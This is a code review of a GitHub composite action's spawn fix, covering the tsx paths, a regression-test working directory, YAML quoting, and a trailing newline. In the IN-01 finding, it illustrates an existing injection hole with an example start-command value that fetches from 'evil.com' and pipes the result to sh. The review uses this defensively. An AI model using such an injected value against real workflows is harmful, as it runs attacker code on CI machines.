## Summary

The Phase 01.2 fix correctly replaces `npx tsx` with a path-resolved binary
at the two call sites in `action.yml` (Step 5 line 169, Step 6 line 204).
The two spawn shapes are deliberately asymmetric — Step 5 uses absolute
`${{ github.action_path }}/node_modules/.bin/tsx` because it intentionally
runs in `github.workspace` (the consumer checkout) so `start-command`
resolves against the consumer repo, while Step 6 uses relative
`./node_modules/.bin/tsx` together with `working-directory: ${{ github.action_path }}`.
Both shapes are correct for their working-directory contexts. The associated
regression test job `self-test-hyphenated-input-env` exercises the new spawn
convention with a hyphenated `INPUT_FOO-BAR` env var and asserts survival
intact at the Node process — its assertion is sound and free of secret
exposure.

The findings below are all minor. There is one **Warning** about a
divergence between the regression-test job's working directory and the
real `action.yml` Step 6 spawn (which weakens but does not invalidate the
test), and four **Info** items covering pre-existing shell-injection
exposure on the `start-command` interpolation, an `inputs.commit-sha`
quoting nit, the asymmetry of the two new spawn shapes (justified but
worth documenting), and a missing trailing newline in the workflow file.

No Critical issues. No new secrets are introduced; the test job uses the
literal value `hello` (not a canary token), so no masking concern arises
from the new code path.

## Warnings

### WR-01: Regression-test job exercises a different working directory than the real Step 6 spawn

**File:** `.github/workflows/phase1-self-test.yml:272-284`
**Issue:** The new `self-test-hyphenated-input-env` job runs `npm ci --production`
and then `./node_modules/.bin/tsx -e "..."` in the **default** working
directory (`$GITHUB_WORKSPACE`, the action repo's checkout root). In contrast,
`action.yml` Step 6 runs the same spawn one-liner with an explicit
`working-directory: ${{ github.action_path }}`. Because this self-test runs
inside the action's own repository, those two paths happen to resolve to the
same `package.json` in CI today — but the test is therefore implicitly relying
on "self-host" symmetry rather than reproducing the real Step 6 invocation
shape end-to-end. If a future refactor moves `package.json` (e.g., introducing
a sub-package layout) the test will silently install a different dependency
tree than Step 6 does and could either pass while the real action breaks, or
fail spuriously. The fix is cheap and makes the regression test contract
explicit: pin both the install and spawn to `github.action_path`, matching
action.yml exactly.

**Fix:**
```yaml
      - name: Install action runtime deps (matches action.yml Step 2)
        shell: bash
        working-directory: ${{ github.action_path }}
        run: npm ci --production

      - name: Assert hyphenated INPUT_* survives ./node_modules/.bin/tsx spawn
        shell: bash
        working-directory: ${{ github.action_path }}
        env:
          INPUT_FOO-BAR: hello
        run: |
          set -euo pipefail
          ./node_modules/.bin/tsx -e "if (process.env['INPUT_FOO-BAR'] !== 'hello') { console.error('::error::INPUT_FOO-BAR was stripped or mutated. Got:', JSON.stringify(process.env['INPUT_FOO-BAR'])); process.exit(1); } console.log('OK: INPUT_FOO-BAR survived spawn (length=' + process.env['INPUT_FOO-BAR'].length + ')');"
```
Note: `${{ github.action_path }}` resolves to the directory of the action
being invoked — when the workflow doesn't `uses: ./` (as is the case here),
it defaults to the repository root, which is identical to the workspace.
Setting it explicitly therefore costs nothing today and locks in the
contract. (Alternative: keep the current shape but add a YAML comment
explaining why the working-directory omission is intentional.)

## Info

### IN-01: Pre-existing shell-injection exposure on `start-command` is not introduced by this phase but should be documented

**File:** `action.yml:167`
**Issue:** Step 5 does `bash -c "exec ${{ inputs.start-command }}" &`, which
double-interpolates the consumer-supplied `start-command` value into a
double-quoted bash `-c` argument. A consumer who passes
`start-command: 'npm run dev"; curl evil.com | sh; #'` would achieve command
injection. This is **not introduced by Phase 01.2** (the line was already
present pre-fix) and is consistent with the existing Step 4 pattern
(`run: ${{ inputs.setup-command }}`). Both sites trust the consumer to
supply a benign command — the security model treats the workflow author as
trusted. Mentioning here only because the phase moved this code through
review and a `# trusted-input` comment would help future reviewers.
**Fix:** Add a one-line comment above line 167:
```yaml
        # NOTE: start-command is consumer-trusted input (composite-action
        # convention); not validated. See SECURITY.md trust model.
        bash -c "exec ${{ inputs.start-command }}" &
```

### IN-02: Step 5 vs Step 6 spawn-shape asymmetry is justified but undocumented

**File:** `action.yml:166-169` and `action.yml:174,204`
**Issue:** Step 5 uses absolute paths (`${{ github.action_path }}/node_modules/.bin/tsx`
+ absolute script path) with no `working-directory`, while Step 6 uses relative
`./node_modules/.bin/tsx src/index.ts` with `working-directory: ${{ github.action_path }}`.
The asymmetry is correct — Step 5 must keep the shell's CWD at
`github.workspace` so `inputs.start-command` (e.g., `npm run dev`) resolves
against the consumer repo, while Step 6's CWD is irrelevant to the user
command. But a future contributor unifying these "for consistency" would
break Step 5. The existing comment on lines 156-157 explains the
working-directory choice but does not flag the spawn-shape divergence.
**Fix:** Extend the comment block at lines 156-157 to:
```yaml
      # No working-directory — composite default is github.workspace (consumer checkout).
      # start-command (e.g. npm run dev) runs from the consumer repo, not the action dir.
      # Spawn uses absolute ${{ github.action_path }} paths for tsx + script
      # *because* the CWD is the consumer repo. Step 6 uses the relative
      # ./node_modules/.bin/tsx form because its working-directory IS the action dir.
      # Do not unify these "for consistency" — the asymmetry is load-bearing.
```

### IN-03: `inputs.commit-sha` is interpolated into `ref:` without quoting — tolerable but worth noting

**File:** `action.yml:131`
**Issue:** `ref: ${{ inputs.commit-sha }}` is unquoted. For a 40-char hex SHA
this is safe (no YAML-special chars), and the `if:` guard on line 128
(`inputs.commit-sha != ''`) handles the empty-string case. However,
unquoted YAML scalars from interpolation are a recurring footgun (e.g., a
value of `yes`/`no`/`on`/`off` would be coerced to a boolean by YAML 1.1).
This is not a Phase 01.2 change and not exploitable for SHAs, but
quoting `ref: '${{ inputs.commit-sha }}'` is a free hardening.
**Fix:**
```yaml
        ref: '${{ inputs.commit-sha }}'
```

### IN-04: Missing trailing newline on workflow file

**File:** `.github/workflows/phase1-self-test.yml:284`
**Issue:** The file appears to end without a trailing newline (line 285 is
blank in the read but the final content line has no terminator visible).
POSIX text files should end with `\n`; many YAML parsers tolerate the
omission, GitHub's runner does, but linters (`yamllint`, `editorconfig`)
will flag it.
**Fix:** Add a single newline at end of file. (Editor "ensure trailing
newline" setting handles this on save.)
